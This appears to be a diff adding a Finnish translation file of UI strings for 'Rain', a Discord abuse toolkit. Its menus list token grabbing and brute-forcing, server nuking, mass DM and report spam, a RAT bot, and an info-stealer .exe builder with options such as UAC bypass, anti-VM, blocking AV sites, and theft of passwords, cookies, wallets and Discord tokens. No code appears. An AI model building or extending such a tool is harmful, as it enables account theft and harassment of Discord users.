@@ -1,0 +1,396 @@
+Token tieto{end_space14}
+Token kirjautuminen{end_space7}
+Token tuhoaja{end_space12}
+Token sieppaaja{end_space10}
+Tokenin poistaja{end_space9}
+Token Brute-Force{end_space8}
+Väärennetty näppäilijä{end_space3}
+Turhamaisuusampuja{end_space7}
+Ryhmäkeskustelu spämmääjä
+Ystävien esto{end_space12}
+Ystävien poistaja{end_space13}
+Ystäväpyynnön poistaja{end_space3}
+Luo uusia palvelimia{end_space5}
+Profiilin vaihtaja{end_space7}
+QR-koodin sieppaaja{end_space6}
+Discord Rotta Botti{end_space6}
+Napin painelija{end_space10}
+Viestin reaktori{end_space9}
+Massa DM{end_space17}
+Massa raportti{end_space11}
+Massa ystävä{end_space13}
+DM poistaja{end_space14}
+DM tyhjentäjä{end_space12}
+Ohita säännöt{end_space12}
+Ohita RestoreCord{end_space8}
+Ohita Sledge Hammer{end_space6}
+Webhook työkalu{end_space10}
+Valmistanut Plingenn{end_space5}
+Muutosloki{end_space15}
+Asetukset{end_space16}
+Keskustelu
+Hallitse tunnisteita
+Seur. sivu{end_space1}
+Suoritetaan:{end_space8}
+Virheellinen valinta, yritä uudelleen!
+Käyttäjän keskeyttämä.
+Teeman vaihtaja
+Tiliasetukset
+Proxy-asetukset
+Ulkonäköasetukset
+Vianjäljitystilan vaihto
+Ylläpitopaneeli
+Virheellinen asetus
+SYAANI
+SININEN
+VIHREÄ
+PUNAINEN
+VALKOINEN
+KELTAINEN
+MAGENTA
+HAILEA PUNAINEN
+HAILEA SININEN
+HAILEA VIHREÄ
+HAILEA SYAANI
+HAILEA MUSTA
+Teema asetettu
+Tilin yleiskatsaus
+Oma lisenssi
+Ostohistoria
+Lunastuskoodi
+Lataa ohjelmisto
+Käyttäjänimi
+Luotiin
+Vaihda käyttäjänimeä
+Kirjaudu ulos
+Käyttäjänimen vaihto epäonnistui, Käyttäjänimen on oltava vähintään 3 merkkiä pitkä.
+Haluatko kirjautua ulos tililtäsi? (K/E)
+Tuote
+Vanhenee
+Päivämäärä
+Syötä tuotekoodi saadaksesi sisältösi.
+Koodi
+Olet jo lunastanut koodin.
+Varmista, että tallennat tuotteesi ennen Enter-painikkeen painamista!
+Avainta ei löydy vastauksesta
+Tietojen hakeminen annetulle koodille epäonnistui
+URL:ää ei löytynyt kooditiedoista
+Virheellinen koodi!
+Vaihda proxy-käyttöä
+Tyhjennä proxy-välimuisti
+Lisää omat proxysi välimuistiin
+Kaavi proxy
+Virheellinen valinta
+Virheenkorjaustila käännetty POIS
+Virheenkorjaustila käännetty PÄÄLLE
+Lisätty uusi todennusjärjestelmä
+Parannettu konfiguraatiojärjestelmä
+Uudelleen tehty paneelin käyttöliittymä
+Lisätty chat-järjestelmä
+Lisätty uusia tiliasetuksia
+Välimuistin käyttöönotto paremman suorituskyvyn varmistamiseksi
+Mukautettu Discord RPC
+Vaihda Discord RPC
+Vaihda mukautettu Discord RPC
+Muokkaa mukautettua Discord RPC:tä
+Mukautettu Discord RPC käännetty POIS
+Mukautettu Discord RPC käännetty PÄÄLLE
+Yksityiskohdat (Pakollinen)
+Yksityiskohtien on oltava vähintään 3 merkkiä pitkiä.
+Tila (Pakollinen)
+Tilan on oltava vähintään 3 merkkiä pitkä.
+Suuri kuvan URL (Valinnainen)
+Suuri teksti (Valinnainen)
+Pieni kuvan URL (Valinnainen)
+Pieni teksti (Valinnainen)
+Kuinka monta painiketta haluat olla?
+Syötä nimi painikkeelle
+Syötä URL-osoite painikkeelle
+Virheellinen URL-muoto. Syötä kelvollinen URL-osoite.
+Virheellinen painikkeiden määrä. Syötä määrä väliltä 0 ja 2.
+Discord RPC Käännetty POIS
+Discord RPC Käännetty PÄÄLLE
+Normaali tila
+RestoreCord-tila (ohita captcha)
+Välimuistin tarkistaja
+Mukautettu tarkistaja
+Palvelimen tarkistaja
+Syötä mukautettu polku ladataksesi tokenit
+Normaali keskustelu
+Tuki keskustelu (Ei käytettävissä)
+Yksityinen keskustelu (Ei käytettävissä)
+Palvelimen etsintä{end_space7}
+Palvelimen kloonaus{end_space6}
+Palvelimen tuhoaja{end_space7}
+Token-liittäjä{end_space11}
+Tokenien poistaja{end_space8}
+Tokenien lähettäjä{end_space7}
+Kouristus{end_space16}
+Kohtaus{end_space18}
+Ääni chatin liittäjä{end_space5}
+Profiilikuvan vaihtaja{end_space7}
+Globaali nikin vaihtaja{end_space2}
+Lempinimen vaihtaja{end_space9}
+HypeSquadin vaihtaja{end_space5}
+Pronominien vaihtaja{end_space5}
+Kielen vaihtaja{end_space10}
+Tilan vaihtaja{end_space11}
+Teeman vaihtaja{end_space10}
+Bio vaihtaja{end_space13}
+Tilinluoja{end_space15}
+Videokaatumisen luoja{end_space4}
+Asetusten pyörittäjä{end_space9}
+Versiopäivitykset{end_space8}
+Telegram{end_space17}
+Itsebot{end_space18}
+Github{end_space19}
+Tietoja{end_space18}
+Poistu{end_space19}
+Edellinen sivu{end_space1}
+Palvelinten nimet
+Viesti
+Keskustelun määrä
+Tapahtui virhe:
+Ei koodeja löytynyt välimuistista
+Sateen Nuke:n asennus
+Sade Nuke:n asennettu. . .
+Viestintä
+Viestin tunniste:
+Lähetetty viesti kaikille saatavilla oleville ystäville.
+Lähti kilta:
+Poistettu kilta:
+Seuraava virhe on kohdattu ja sitä ei huomioida:
+Kaikki käytettävissä olevat killat poistettu.
+Ystävän poistaminen:
+Poistettu ystävä:
+Poistettiin kaikki käytettävissä olevat ystävät.
+Luodaan
+Luotu
+Luotu kaikki palvelimet.
+Sade Nuke räjähti onnistuneesti!
+Onnistuneesti muuttunut Reme Wastelandiksi
+Syötä jotain jatkaaksesi. . .
+Alkaa takavarikkotila (Valo/pimeä tila)
+Ei tarpeeksi ystäviä jatkamiseen.
+Tapahtui virhe käsittäessä koodia
+Kanavan roskapostittaja
+Kanavan tunniste
+Sääntöjen ohitus
+Killan tunniste
+Väärennetyn kirjoittajan syöttäjä
+Globaali lempinimi
+Nimimerkki
+Palvelimen nimimerkki
+Pronomien vaihtaja
+Satunnaiset pronominit (k/e)
+Pronominit
+Poistettu DM:
+Ei tarpeeksi DM:ä jatkamiseen.
+Jakso keskeytetty
+Äänenhallintaroiskuttaja
+Ohjelma keskeytetty käyttäjän toimesta.
+Sydämenlyöntiä ei voitu lähettää koodilla:
+VC:hen liittymistä koodilla ei onnistuttu:
+Liittyminen VC:hen koodilla.
+Kutsun päivitys onnistui, palvelimellesi voi nyt päästä
+Vanity-URL:n päivitys epäonnistui. Statuskoodi:
+Vanity-koodi napataaksesi
+Palvelimen tunniste Vanitylle
+Viive tarkistusten välillä (sekunteina)
+Vanity Sniper on aloitettu. Pidä Ctrl+C painettuna pysäyttääksesi.
+Virhe:
+Webhook-roiskuttaja
+Webhookin poistaja
+Webhook
+Webhook onnistuneesti poistettu
+Tokenien hallinta
+Tallenna tokenit
+Tyhjennä tokenit
+Tarkista tokenit ja tallenna vain kelvolliset (k/e)
+Tokenivälimuisti tyhjennetty.
+Syötä polku tekstitiedostoon, joka sisältää tokenit
+Ei löytynyt koodeja määritetystä tekstitiedostosta
+Tokenin tarkistus
+Epäonnistui hankkimaan palvelimen nimeä:
+Liityntä
+Sateen tokenin brute-force. PS: Tämä voi kestää kauan toimiakseen.
+Jos olet äärimmäisen onnekas ja kykenevä saamaan jonkun tokenin, löydät sen tallennettuna 'brute-force.txt' -tiedostoon.
+Hanki aina yksilöltä nimenomainen lupa ennen brute force -hyökkäyksen suorittamista heidän tilillään.
+Virheellinen käyttäjä-ID, yritä uudelleen!
+KELVOLLINEN
+EPÄKELVON
+Virhe haettaessa laskutuslähteitä:
+Virhe haettaessa nitrotietoja:
+Ei laskutustietoja saatavilla.
+Käyttäjätietojen ja webdriverien kerääminen..
+Tiedoston nimi
+Tiedoston salasana
+Haluatko antaa kuvakkeen tiedoston? (k/e)
+Virheellinen kuvakkeen polku tai URL. Asetetaan kuvake "None".
+Pingaa minut (k/e)
+Anti-VM (k/e)
+Käynnistyksen yhteydessä (k/e)
+UAC-ohitus (k/e)
+Sulaa (k/e)
+Piilota konsoli (k/e)
+Tallenna web-kamera (k/e)
+Tallenna salasanat (k/e)
+Tallenna evästeet (k/e)
+Tallenna automaattitäytöt (k/e)
+Tallenna historia (k/e)
+Tallenna Discord-tokenit (k/e)
+Tallenna pelit (k/e)
+Tallenna Wi-Fi-salasanat (k/e)
+Tallenna järjestelmätiedot (k/e)
+Tallenna näyttökuva (k/e)
+Tallenna Telegram (k/e)
+Tallenna yleiset tiedostot (k/e)
+Tallenna lompakot (k/e)
+Feikkausvirhe (k/e)
+Feikkivirheen otsikko
+Feikkivirheviesti
+Estä AV-sivustot (k/e)
+Discordin ruiskutus (k/e)
+Tiedostokuvake
+Luodaan {name}.exe, Tämä vie muutaman sekunnin. Kiitos kärsivällisyydestäsi!
+Tiedosto on 'output/grabberbuilder/{name}.exe:ssä
+Luotu ryhmäkeskustelu
+Rajoitettu nopeus ({response.json()['retry_after']}ms)
+Ei tarpeeksi ystäviä satunnaisvalintaan
+Haluatko valita käyttäjät itse ryhmäkeskustelujen roskapostitukseen vai haluatko valita satunnaisia?
+Valitse käyttäjät itse
+Satunnaisvalinta käyttäjistä
+Ryhmäkeskustelujen luominen
+Käyttäjätunnukset
+Sinulla ei ollut mitään pilkkuja (,) muoto on id,id2,id3
+milloin tahansa lopettaaksesi
+Estetty:
+Virhe suhteiden hankinnassa:
+Ei tarpeeksi kaveripyynnötä jatkamiseen.
+Saapuva kaveripyyntö:
+Poistettu kaveripyyntö:
+Kaikki kaveripyynnöt poistettu:
+Virhe luotaessa {server_name}: {e}
+kuvake palvelimille kyllä/ei
+Satunnaiset palvelinnimet
+Mukautetut palvelinnimet
+Palvelimet, jotka luodaan
+Anna kuvakkeen sijainti
+"{image}" ei löytynyt tietokoneeltasi
+Mukautettu tila
+Mukautettu bio
+Tiedoston luominen... {i}
+Tiedoston kirjoittaminen... {i}
+Huomautus: Tämä koodi ei ole täysin toimiva tällä hetkellä, mutta se on silti suoritettavissa.\nKuitenkin, saatat kohdata virheitä tai bugeja.
+Anna nimi, jonka haluat antaa lopulliselle tiedostolle
+Anna bottisi token, jota käytät RAT-komentojen suorittamiseen
+Botin token
+Anna kiltan ID, johon viivan komennot on rekisteröity
+Virhe kirjoittaessa tiedostoa: {e}
+Tiedosto on kirjoitettu oikein "output/{fileName}.py"
+Muunna skriptisi suoritettavaksi (K/E)
+Tiedoston luominen...
+Vanhojen tiedostojen siivoaminen...
+Suoritettava tiedosto on luotu oikein
+HTTP-virhe tapahtui: {e}
+Viestin ID
+Valitse painike, jonka haluat painaa
+{r}({LIGHTBLACK_EX}{i}{r}) Nimi: {LIGHTBLACK_EX}{button_label}{r} , Mukautettu ID: {LIGHTBLACK_EX}{button_custom_id}
+Painike
+Vain yksi painike löytyi viestistä.
+Painikkeen {reaction} lisääminen viestiin {message_id} epäonnistui. Maksimimäärä reaktioita on jo saavutettu.
+Maksimimäärä reaktioita on jo saavutettu.
+Painikkeen {reaction} lisääminen viestiin {message_id} epäonnistui. Kielletty: {error_message}
+Esineet
+Naamat
+Eläimet
+Symbolit
+Vastausta ei löytynyt emojien hakemiseen
+Emojien hakeminen API:sta epäonnistui
+Kutsulinkki
+Virheellinen kutsulinkin muoto.
+Virhe tapahtui pyynnön lähettämisessä
+Kutsutiedot:
+Kutsujan tiedot:
+Palvelimen tiedot:
+Kanava
+Päättymispäivä
+Käyttäjä-ID
+Tunnukset
+Ei saatavilla
+Nimi
+Palvelimen ID
+Kuvaus
+Banneri
+Bannerin URL-osoite
+Bannerin URL-osoite (ei saatavilla)
+Turhamaisuuden URL
+Varmistustaso
+Splash
+Splashin URL-osoite
+Splashin URL-osoite (ei saatavilla)
+Ominaisuudet
+Kohtauksen aloittaminen. Paina Ctrl+C lopettaaksesi.
+Kohtaus keskeytettiin
+Kielenvaihdon aloittaminen. Paina Ctrl+C lopettaaksesi.
+Virheellinen token.
+Paina ENTER jatkaaksesi
+Discord API -työkalu | https://Rain.xyz | Tehnyt Plingenn
+Ulkonäön asetukset
+Tekstin asetukset
+Kursorin asetukset
+Läpinäkyvyysasetukset
+Ikkuna-asetukset
+Kielen asetukset
+Värimaailma
+Fontin tyyli
+Fonttikoko
+Rivin korkeus
+Fontin paksuus
+Retro-terminaalivaikutukset
+Väriasetukset
+Fonttiasetukset
+Fonttikoon asetukset
+Rivin korkeuden asetukset
+Fontin paksuuden asetukset
+Retro-asetukset
+Kursorin asetukset
+Kieli asetettu {chosen_language}
+Nimetön
+Tyyppi
+Talo
+Viestilinkki
+Virheellinen viestilinkki
+Palaaminen...
+Yhteys Discordin RPC:hen epäonnistui: {e}
+Valinta
+Teema
+Asetus
+Muokkaa
+Kieli
+Paneelin läpinäkyvyys
+Virheellinen läpinäkyvyys
+Ikkuna-asetukset
+Tämä vaihtoehto on keskeneräinen
+Tämä vaihtoehto ei ole tällä hetkellä käytettävissä. Ole kärsivällinen, koska se lisätään myöhemmin.
+Tämä vaihtoehto ei ole tällä hetkellä käytettävissä.
+Se korvataan jossakin tulevassa päivityksessä: '{replacement}'.
+Tämä vaihtoehto ei ole käytettävissä
+Nämä vaihtoehdot ovat tällä hetkellä kehitysvaiheessa
+Nämä vaihtoehdot ovat tällä hetkellä kehitysvaiheessa, mutta niitä voi silti käyttää. On kuitenkin mahdollista, että ilmenee virheitä tai bugeja.
+Pronominien hakeminen epäonnistui osoitteesta {pronounce_url} ({statuscode})
+Proxyjen käyttö ei tällä hetkellä ole käytettävissä. Pahoittelemme mahdollista haittaa. Se on saatavilla yhdessä tulevista päivityksistämme.
+Proxy-käyttö kytketty pois päältä
+Proxy-käyttö kytketty päälle
+Uudet proxynkirjoitus onnistui
+Proxyt on kaavittu onnistuneesti
+Valmis! Kaavittu {proxies} kokonaismäärästä => {temp} | {execution_time}ms
+PC
+Monikielituki on otettu käyttöön.
+Massaketju{end_space15}
+Foorumispämmer
+Massaviesti käyttäjille{end_space2}
+Ei sovellettavissa{end_space7}
+Palvelimen nostaja{end_space12}
+Token-verkko käyttäjä{end_space4}
+Kyselyn luoja{end_space12}
